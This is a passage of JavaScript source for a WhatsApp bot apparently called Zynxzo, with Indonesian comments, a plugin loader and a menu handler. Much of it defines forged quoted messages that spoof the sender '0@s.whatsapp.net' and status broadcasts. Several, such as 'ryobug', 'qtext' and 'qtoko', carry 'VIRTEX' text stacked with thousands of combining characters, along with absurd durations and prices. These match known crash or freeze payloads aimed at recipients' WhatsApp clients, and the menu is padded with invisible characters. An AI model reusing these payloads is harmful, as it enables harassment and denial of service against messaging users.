̫̪̫̫̫̫̫̫̫̫̫⃟꙰𝗰̴̴̴̴̴̴̴̛̛̛̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̜̜̜̜̜̜̬̬̬̩̱̱̇̓̓̓̓̓̓̔̔̔̎̎̎̊̊̊̕꙰𝗶̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̈⃟⃢̦̦̦̦̦̦̦̦̦̦̦̦̕˺̴̴̤̤̜̤̖̣̬̬̬̞̞̱̩̬̝̝̓̓̔̔̔̔̊̊̎̎̎̔̕꙰�˺꙰˺̴̴̴̤̤̤̤̤̤̤̤̤̞̞̞̞̞̞̞̞̬̣̣̣̣̜̜̊̊̔̔̔̔̔̔̕ɱ̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫⃟⃢꙰̯̯̯̯̯̯̯̯๎̯๎̯ࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩ͌͌͌͌͌͌͌͌͌͌͌͌𝗮̨̫̫̫̫̫̫̪̪̪̪̪̪̪̪̪̫̪̫̫̫̫̫̫̫̫̫⃟꙰𝗰̴̴̴̴̴̴̴̛̛̛̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̜̜̜̜̜̜̬̬̬̩̱̱̇̓̓̓̓̓̓̔̔̔̎̎̎̊̊̊̕꙰𝗶̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̈⃟⃢̦̦̦̦̦̦̦̦̦̦̦̦̕˺̴̴̤̤̜̤̖̣̬̬̬̞̞̱̩̬̝̝̓̓̔̔̔̔̊̊̎̎̎̔̕꙰�˺꙰*˺̴̴̴̤̤̤̤̤̤̤̤̤̞̞̞̞̞̞̞̞̬̣̣̣̣̜̜̊̊̔̔̔̔̔̔̕*







𝗗𝗮𝘀𝗮𝗿 
𝙂𝙄𝙏𝙐 𝘼𝙅𝘼 𝙋𝘼𝙉𝙄𝙆🗿
𝘽𝙐𝙆𝘼𝙉 𝙑𝙄𝙍𝙏𝙀𝙓 𝘼𝙎𝙇𝙄`
}
}
}

const qdoc = {
key: {
participant: '0@s.whatsapp.net',
...(m.chat ? {
remoteJid: `status@broadcast`
} : {})
},
message: {
documentMessage: {
title: `🖥️༐✲ 𝐌𝐬𝐠 𒑊 ${m.body || m.mtype}`,
jpegThumbnail: fakedoc,
}
}
}
const qvn = {
key: {
participant: `0@s.whatsapp.net`,
...(m.chat ? {
remoteJid: "status@broadcast"
} : {})
},
message: {
"audioMessage": {
"mimetype": "audio/ogg; codecs=opus",
"seconds": 359996400,
"ptt": "true"
}
}
}

const qtext = {
key: {
fromMe: false,
participant: `0@s.whatsapp.net`,
...(m.chat ? {
remoteJid: "status@broadcast"
} : {})
},
message: {
"extendedTextMessage": {
"text": `🖥️༐✲ 𝐌𝐬𝐠 𒑊 ${m.body || m.mtype}`,
"title": `《《   ֎ ⃢☠️☠️ 𝗩𝗜𝗥𝗧𝗘𝗫 ☠️‼️❌⚠️‼️🚫‼️‼️‼️〄 ⃢🔥 ²⁰²⁴》》
_*██ 𝗩𝗜𝗥𝗧𝗘𝗫██*_ 
𖣘𝓜꙰⃢⃠⃠⃠⃠⃠*_🇲🇾⁘̨̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̽̈
*ɱ̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫⃟⃢꙰̯̯̯̯̯̯̯̯๎̯๎̯ࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩ͌͌͌͌͌͌͌͌͌͌͌͌𝗮̨̫̫̫̫̫̫̪̪̪̪̪̪̪̪̪̫̪̫̫̫̫̫̫̫̫̫⃟꙰𝗰̴̴̴̴̴̴̴̛̛̛̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̜̜̜̜̜̜̬̬̬̩̱̱̇̓̓̓̓̓̓̔̔̔̎̎̎̊̊̊̕꙰𝗶̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̈⃟⃢̦̦̦̦̦̦̦̦̦̦̦̦̕˺̴̴̤̤̜̤̖̣̬̬̬̞̞̱̩̬̝̝̓̓̔̔̔̔̊̊̎̎̎̔̕꙰�˺꙰˺̤̤̤̤̤̤̤̤̤̞̞̞̞̞̞̞̞̬̣̣̊̊̔̔̔̔̔̔ɱ̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫⃟⃢꙰̯̯̯̯̯̯̯̯๎̯๎̯ࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩ͌͌͌͌͌͌͌͌͌͌͌͌𝗮̨̫̫̫̫̫̫̪̪̪̪̪̪̪̪̪̫̪̫̫̫̫̫̫̫̫̫⃟꙰𝗰̴̴̴̴̴̴̴̛̛̛̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̜̜̜̜̜̜̬̬̬̩̱̱̇̓̓̓̓̓̓̔̔̔̎̎̎̊̊̊̕꙰𝗶̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̈⃟⃢̦̦̦̦̦̦̦̦̦̦̦̦̕˺̴̴̤̤̜̤̖̣̬̬̬̞̞̱̩̬̝̝̓̓̔̔̔̔̊̊̎̎̎̔̕꙰�˺꙰˺̴̴̴̤̤̤̤̤̤̤̤̤̞̞̞̞̞̞̞̞̬̣̣̣̣̜̜̊̊̔̔̔̔̔̔̕ɱ̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫⃟⃢꙰̯̯̯̯̯̯̯̯๎̯๎̯ࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩ͌͌͌͌͌͌͌͌͌͌͌͌𝗮̨̫̫̫̫̫̫̪̪̪̪̪̪̪̪̪̫̪̫̫̫̫̫̫̫̫̫⃟꙰𝗰̴̴̴̴̴̴̴̛̛̛̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̜̜̜̜̜̜̬̬̬̩̱̱̇̓̓̓̓̓̓̔̔̔̎̎̎̊̊̊̕꙰𝗶̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̈⃟⃢̦̦̦̦̦̦̦̦̦̦̦̦̕˺̴̴̤̤̜̤̖̣̬̬̬̞̞̱̩̬̝̝̓̓̔̔̔̔̊̊̎̎̎̔̕꙰�˺꙰*˺̴̴̴̤̤̤̤̤̤̤̤̤̞̞̞̞̞̞̞̞̬̣̣̣̣̜̜̊̊̔̔̔̔̔̔̕*







𝗗𝗮𝘀𝗮𝗿 
𝙂𝙄𝙏𝙐 𝘼𝙅𝘼 𝙋𝘼𝙉𝙄𝙆🗿
𝘽𝙐𝙆𝘼𝙉 𝙑𝙄𝙍𝙏𝙀𝙓 𝘼𝙎𝙇𝙄͙̹ ⿻ 𝐂𝐋͢𝐢𝚵𝐍͢𝐓 々`,
'jpegThumbnail': fakejpg,
}
}
}

const qtoko = {
key: {
fromMe: false,
participant: `0@s.whatsapp.net`,
...(m.chat ? {
remoteJid: "status@broadcast"
} : {})
},
message: {
"productMessage": {
"product": {
"productImage": {
"mimetype": "image/jpeg",
"jpegThumbnail": fakejpg,
},
"title": `🖥️༐✲ 𝐌𝐬𝐠 𒑊 ${m.body || m.mtype}`,
"description": `《《   ֎ ⃢☠️☠️ 𝗩𝗜𝗥𝗧𝗘𝗫 ☠️‼️❌⚠️‼️🚫‼️‼️‼️〄 ⃢🔥 ²⁰²⁴》》
_*██ 𝗩𝗜𝗥𝗧𝗘𝗫██*_ 
𖣘𝓜꙰⃢⃠⃠⃠⃠⃠*_🇲🇾⁘̨̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̽̈
*ɱ̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫⃟⃢꙰̯̯̯̯̯̯̯̯๎̯๎̯ࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩ͌͌͌͌͌͌͌͌͌͌͌͌𝗮̨̫̫̫̫̫̫̪̪̪̪̪̪̪̪̪̫̪̫̫̫̫̫̫̫̫̫⃟꙰𝗰̴̴̴̴̴̴̴̛̛̛̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̜̜̜̜̜̜̬̬̬̩̱̱̇̓̓̓̓̓̓̔̔̔̎̎̎̊̊̊̕꙰𝗶̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̈⃟⃢̦̦̦̦̦̦̦̦̦̦̦̦̕˺̴̴̤̤̜̤̖̣̬̬̬̞̞̱̩̬̝̝̓̓̔̔̔̔̊̊̎̎̎̔̕꙰�˺꙰˺̤̤̤̤̤̤̤̤̤̞̞̞̞̞̞̞̞̬̣̣̊̊̔̔̔̔̔̔ɱ̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫⃟⃢꙰̯̯̯̯̯̯̯̯๎̯๎̯ࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩ͌͌͌͌͌͌͌͌͌͌͌͌𝗮̨̫̫̫̫̫̫̪̪̪̪̪̪̪̪̪̫̪̫̫̫̫̫̫̫̫̫⃟꙰𝗰̴̴̴̴̴̴̴̛̛̛̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̜̜̜̜̜̜̬̬̬̩̱̱̇̓̓̓̓̓̓̔̔̔̎̎̎̊̊̊̕꙰𝗶̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̈⃟⃢̦̦̦̦̦̦̦̦̦̦̦̦̕˺̴̴̤̤̜̤̖̣̬̬̬̞̞̱̩̬̝̝̓̓̔̔̔̔̊̊̎̎̎̔̕꙰�˺꙰˺̴̴̴̤̤̤̤̤̤̤̤̤̞̞̞̞̞̞̞̞̬̣̣̣̣̜̜̊̊̔̔̔̔̔̔̕ɱ̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫⃟⃢꙰̯̯̯̯̯̯̯̯๎̯๎̯ࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩ͌͌͌͌͌͌͌͌͌͌͌͌𝗮̨̫̫̫̫̫̫̪̪̪̪̪̪̪̪̪̫̪̫̫̫̫̫̫̫̫̫⃟꙰𝗰̴̴̴̴̴̴̴̛̛̛̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̜̜̜̜̜̜̬̬̬̩̱̱̇̓̓̓̓̓̓̔̔̔̎̎̎̊̊̊̕꙰𝗶̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̈⃟⃢̦̦̦̦̦̦̦̦̦̦̦̦̕˺̴̴̤̤̜̤̖̣̬̬̬̞̞̱̩̬̝̝̓̓̔̔̔̔̊̊̎̎̎̔̕꙰�˺꙰*˺̴̴̴̤̤̤̤̤̤̤̤̤̞̞̞̞̞̞̞̞̬̣̣̣̣̜̜̊̊̔̔̔̔̔̔̕*







𝗗𝗮𝘀𝗮𝗿 
𝙂𝙄𝙏𝙐 𝘼𝙅𝘼 𝙋𝘼𝙉𝙄𝙆🗿
𝘽𝙐𝙆𝘼𝙉 𝙑𝙄𝙍𝙏𝙀𝙓 𝘼𝙎𝙇𝙄🔥 ⿻ 𝐂𝐋͢𝐢𝚵𝐍͢𝐓 々`,
"currencyCode": "IDR",
"priceAmount1000": "1000000000000000000",
"retailerId": `🖥️༐✲ 𝐌𝐬𝐠 𒑊 ${m.body || m.mtype}`,
"productImageCount": 1
},
"businessOwnerJid": `0@s.whatsapp.net`
}
}
}

const ryovoice = {
key: {
participant: `0@s.whatsapp.net`,
...(m.chat ? {
remoteJid: ""
} : {})
},
message: {
"audioMessage": {
"mimetype": "audio/ogg; codecs=opus",
"seconds": 9999999999,
"ptt": "true"
}
}
}


const fpoll = {
key: {
participant: `0@s.whatsapp.net`,
...(m.chat ? {
remoteJid: ""
} : {})
},
message: {
"pollCreationMessage": {
"name": "p"
}
}
}

const qgif = {
key: {
participant: `0@s.whatsapp.net`,
...(m.chat ? {
remoteJid: "status@broadcast"
} : {})
},
message: {
"videoMessage": {
"title": `🖥️༐✲ 𝐌𝐬𝐠 𒑊 ${m.body || m.mtype}`,
"h": `Hmm`,
'seconds': '359996400',
'gifPlayback': 'true',
'caption': `🖥️༐✲ 𝐌𝐬𝐠 𒑊 ${m.body || m.mtype}`,
'jpegThumbnail': fakejpg,
}
}
}

const qinvite = {
key: {
participant: "0@s.whatsapp.net",
"remoteJid": "0@s.whatsapp.net"
},
"message": {
"groupInviteMessage": {
"groupJid": "6285609833744-1616169743@g.us",
"inviteCode": "m",
"groupName": `🖥️༐✲ 𝐌𝐬𝐠 𒑊 ${m.body || m.mtype}`,
"caption": `🖥️༐✲ 𝐌𝐬𝐠 𒑊 ${m.body || m.mtype}`,
'jpegThumbnail': fakejpg,
}
}
}

const ryobug = {
key: {
participant: `0@s.whatsapp.net`,
...(m.chat ? {
remoteJid: "status@broadcast"
} : {})
},
message: {
listResponseMessage: {
title: `《《   ֎ ⃢☠️☠️ 𝗩𝗜𝗥𝗧𝗘𝗫 ☠️‼️❌⚠️‼️🚫‼️‼️‼️〄 ⃢🔥 ²⁰²⁴》》
_*██ 𝗩𝗜𝗥𝗧𝗘𝗫██*_ 
𖣘𝓜꙰⃢⃠⃠⃠⃠⃠*_🇲🇾⁘̨̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̽̈
*ɱ̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫⃟⃢꙰̯̯̯̯̯̯̯̯๎̯๎̯ࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩ͌͌͌͌͌͌͌͌͌͌͌͌𝗮̨̫̫̫̫̫̫̪̪̪̪̪̪̪̪̪̫̪̫̫̫̫̫̫̫̫̫⃟꙰𝗰̴̴̴̴̴̴̴̛̛̛̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̜̜̜̜̜̜̬̬̬̩̱̱̇̓̓̓̓̓̓̔̔̔̎̎̎̊̊̊̕꙰𝗶̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̈⃟⃢̦̦̦̦̦̦̦̦̦̦̦̦̕˺̴̴̤̤̜̤̖̣̬̬̬̞̞̱̩̬̝̝̓̓̔̔̔̔̊̊̎̎̎̔̕꙰�˺꙰˺̤̤̤̤̤̤̤̤̤̞̞̞̞̞̞̞̞̬̣̣̊̊̔̔̔̔̔̔ɱ̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫⃟⃢꙰̯̯̯̯̯̯̯̯๎̯๎̯ࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩ͌͌͌͌͌͌͌͌͌͌͌͌𝗮̨̫̫̫̫̫̫̪̪̪̪̪̪̪̪̪̫̪̫̫̫̫̫̫̫̫̫⃟꙰𝗰̴̴̴̴̴̴̴̛̛̛̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̜̜̜̜̜̜̬̬̬̩̱̱̇̓̓̓̓̓̓̔̔̔̎̎̎̊̊̊̕꙰𝗶̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̈⃟⃢̦̦̦̦̦̦̦̦̦̦̦̦̕˺̴̴̤̤̜̤̖̣̬̬̬̞̞̱̩̬̝̝̓̓̔̔̔̔̊̊̎̎̎̔̕꙰�˺꙰˺̴̴̴̤̤̤̤̤̤̤̤̤̞̞̞̞̞̞̞̞̬̣̣̣̣̜̜̊̊̔̔̔̔̔̔̕ɱ̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫⃟⃢꙰̯̯̯̯̯̯̯̯๎̯๎̯ࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩ͌͌͌͌͌͌͌͌͌͌͌͌𝗮̨̫̫̫̫̫̫̪̪̪̪̪̪̪̪̪̫̪̫̫̫̫̫̫̫̫̫⃟꙰𝗰̴̴̴̴̴̴̴̛̛̛̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̜̜̜̜̜̜̬̬̬̩̱̱̇̓̓̓̓̓̓̔̔̔̎̎̎̊̊̊̕꙰𝗶̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̈⃟⃢̦̦̦̦̦̦̦̦̦̦̦̦̕˺̴̴̤̤̜̤̖̣̬̬̬̞̞̱̩̬̝̝̓̓̔̔̔̔̊̊̎̎̎̔̕꙰�˺꙰*˺̴̴̴̤̤̤̤̤̤̤̤̤̞̞̞̞̞̞̞̞̬̣̣̣̣̜̜̊̊̔̔̔̔̔̔̕*







𝗗𝗮𝘀𝗮𝗿 
𝙂𝙄𝙏𝙐 𝘼𝙅𝘼 𝙋𝘼𝙉𝙄𝙆🗿
𝘽𝙐𝙆𝘼𝙉 𝙑𝙄𝙍𝙏𝙀𝙓 𝘼𝙎𝙇𝙄`
}
}
}

const qvideo = {
key: {
fromMe: false,
participant: `0@s.whatsapp.net`,
...(m.chat ? {
remoteJid: "status@broadcast"
} : {})
},
message: {
"videoMessage": {
"title": `🖥️༐✲ 𝐌𝐬𝐠 𒑊 ${m.body || m.mtype}`,
"h": `Hmm`,
'seconds': '359996400',
'caption': `🖥️༐✲ 𝐌𝐬𝐠 𒑊 ${m.body || m.mtype}`,
'jpegThumbnail': fakejpg,
'viewOnce': true
}
}
}

const qloc = {
key: {
participant: '0@s.whatsapp.net',
...(m.chat ? {
remoteJid: `status@broadcast`
} : {})
},
message: {
locationMessage: {
name: `🖥️༐✲ 𝐌𝐬𝐠 𒑊 ${m.body || m.mtype}`,
jpegThumbnail: fakejpg,
}
}
}

const qloc2 = {
key: {
fromMe: false,
participant: `0@s.whatsapp.net`,
...(m.chat ? {
remoteJid: "status@broadcast"
} : {})
},
message: {
"liveLocationMessage": {
"title": `🖥️༐✲ 𝐌𝐬𝐠 𒑊 ${m.body || m.mtype}`,
"h": `Hmm`,
'jpegThumbnail': fakejpg,
}
}
}

const qcontact = {
key: {
participant: `0@s.whatsapp.net`,
...(m.chat ? {
remoteJid: `status@broadcast`
} : {})
},
message: {
'contactMessage': {
'displayName': `🖥️༐✲ 𝐌𝐬𝐠 𒑊 ${m.body || m.mtype}`,
'vcard': `BEGIN:VCARD\nVERSION:3.0\nN:XL;ttname,;;;\nFN:ttname\nitem1.TEL;waid=0\nitem1.X-ABLabel:Ponsel\nEND:VCARD`,
'jpegThumbnail': fakejpg,
thumbnail: fakejpg,
sendEphemeral: true
}
}
}

//=================================================//
let resize = async (image, width, height) => {
    let oyy = await jimp.read(image)
    let kiyomasa = await oyy.resize(width, height).getBufferAsync(jimp.MIME_JPEG)
    return kiyomasa
}
//=================================================//
const reaction = async (jidss, emoji) => {
    zynxzo.sendMessage(jidss, {
        react: {
            text: emoji,
            key: m.key
        }
    })
}
//=================================================//
async function crtImg(url) {
    const { imageMessage } = await generateWAMessageContent({
        image: { url }
        }, {
            upload: zynxzo.waUploadToServer
        });
    return imageMessage;
}
//=================================================//
async function crtVid(url) {
    const { videoMessage } = await generateWAMessageContent({
        image: { url }
        }, {
            upload: zynxzo.waUploadToServer
        });
    return videoMessage;
}

const zreply = async (teks) => {
await sleep(500)
return zynxzo.sendMessage(m.chat, {
  contextInfo: {
  mentionedJid: [m.sender],
   externalAdReply: {
     showAdAttribution: false,
      renderLargerThumbnail: false,
        title: `☪︎  Zʏɴxᴢᴏ V7.0  ☪︎`,
        body: `Hi ${m.pushName}`,
        previewType: "VIDEO",
            thumbnail: logozynxzo,
            sourceUrl: `${global.url}`,
            mediaUrl: `${global.url}`
            }}, text: teks }, { quoted: zets })
            }
//=================================================//
// Ngambil semua plugin dari direktori dan subdirektori
const loadPlugins = (directory) => {
    let plugins = []
    const folders = fs.readdirSync(directory)
    folders.forEach(folder => {
        const folderPath = path.join(directory, folder)
        if (fs.lstatSync(folderPath).isDirectory()) {
            const files = fs.readdirSync(folderPath)
            files.forEach(file => {
                const filePath = path.join(folderPath, file)
                if (filePath.endsWith(".js")) {
                    try {
                        delete require.cache[require.resolve(filePath)]
                        const plugin = require(filePath)
                        plugin.filePath = filePath
                        plugins.push(plugin)
                    } catch (error) {
                        console.error(`Error loading plugin at ${filePath}:`, error)
                    }
                }
            })
        }
    })
    return plugins
}
// Ngambil semua plugin dari direktori plugin
const plugins = loadPlugins(path.resolve(__dirname, "./plugin"))
const context = { zynxzo, m, chatUpdate, store, body, require, smsg, getGroupAdmins, formatp, h2k, tanggal, formatDate, getTime, isUrl, sleep, clockString, msToDate, sort, toNumber, enumGetKey, runtime, fetchJson, getBuffer, jsonformat, delay, format, logic, generateProfilePicture, parseMention, getRandom, pickRandom, groupMembers, budy, prefixRegex, prefix, isCmd, command, args, pushname, text, q, fatkuns, quoted, mime, qmsg, isMedia, botNumber, itsMe, itsOrkay, kontributor, isDeveloper, isPremium, groupMetadata, groupName, participants, groupAdmins, isBotAdmins, isAdmins, isGroup, groupOwner, isGroupOwner, time, ucapanWaktu, wib, wita, wit, salam, d, gmt, weton, week, calender, dust, reaction, zreply, TelegraPh, toTelegra, resize, remini, crtImg, crtVid }
// Kode ini ngeliat plugin satu per satu, kalo nemu plugin yang cocok ama command yang diterima, dia langsung manggil fungsi operate-nya dan berhenti.
let handled = false
for (const plugin of plugins) {
    if (plugin.command.includes(command)) {
        try {
            await plugin.operate(context)
            handled = true
        } catch (error) {
            console.error(`Error executing plugin ${plugin.filePath}:`, error)
        }
        break
    }
}
//=================================================//
if (m.message) {
    console.log(chalk.green.bgHex("#e74c3c").bold(`\n💫 ${ucapanWaktu} 💫`));
    console.log(chalk.green.bgHex("#e74c3c").bold(`✉️ Pesan Baru`));
    console.log(chalk.black.bgHex("#00FF00")(`💬 Pesan: ${m.body || m.mtype} \n🗣️ Pengirim: ${m.pushName} \n🔢 JID: ${m.sender}`));
    if (m.isGroup) {
        console.log(chalk.black.bgHex("#00FF00")(`🏷️ Grup: ${groupName}`));
        console.log(chalk.black.bgHex("#00FF00")(`🧷 GroupJid: ${m.chat}`));
    }
}
if (!handled) {
switch (command) {
//=================================================//
case 'menu': case 'zynxzo': {
await loading()
darkphonk = fs.readFileSync('./media/audio/menu.mp3')
let imgsc = await prepareWAMessageMedia({
image: logozynxzo
}, {
upload: zynxzo.waUploadToServer
})
let banteng = `┏─╴[ 𝗭𝗬𝗡𝗫𝗭𝗢 𝗦𝗖𝗥𝗜𝗣𝗧 ] ──┓
│ 𝗛𝘆 *${m.pushName}*
│ *${time}*
│ *${ucapanWaktu}*
┗─────────────────┛͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏